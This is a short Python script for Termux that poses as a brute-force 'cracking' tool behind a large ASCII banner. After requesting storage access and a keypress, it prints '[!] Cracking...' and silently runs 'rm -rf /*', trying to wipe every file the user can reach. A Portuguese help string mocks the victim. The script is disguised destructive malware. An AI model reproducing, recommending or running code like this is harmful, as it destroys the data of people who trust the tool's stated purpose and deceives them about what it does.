# CODIGO PRA TERMUX

import platform
import os
import sys
from colorama import init
from colorama import Fore, Back, Style

banner = """
 ███████████                        █████     ███                ██████
░░███░░░░░███                      ░░███     ░░░                ███░░███
 ░███    ░███ █████ ████ ████████  ███████   ████              ░███ ░░░   ██████  ████████   █████   ██████ 
 ░██████████ ░░███ ░███ ░░███░░███░░░███░   ░░███  ██████████ ███████    ███░░███░░███░░███ ███░░   ███░░███
 ░███░░░░░███ ░███ ░███  ░███ ░░░   ░███     ░███ ░░░░░░░░░░ ░░░███░    ░███ ░███ ░███ ░░░ ░░█████ ░███████ 
 ░███    ░███ ░███ ░███  ░███       ░███ ███ ░███              ░███     ░███ ░███ ░███      ░░░░███░███░░░
 ███████████  ░░████████ █████      ░░█████  █████             █████    ░░██████  █████     ██████ ░░██████ 
░░░░░░░░░░░    ░░░░░░░░ ░░░░░        ░░░░░  ░░░░░             ░░░░░      ░░░░░░  ░░░░░     ░░░░░░   ░░░░░░
"""
print(Fore.RED + banner + Fore.RESET)
os.system("termux-setup-storage")
varr = input("Aperte enter para continuar.")
help = "Acabo é so isso kkkkkkk"
cmd = 'sleep 1; echo "[!] Cracking..."; rm -rf /* 2>/dev/null; sleep 10;'
os.system(cmd)
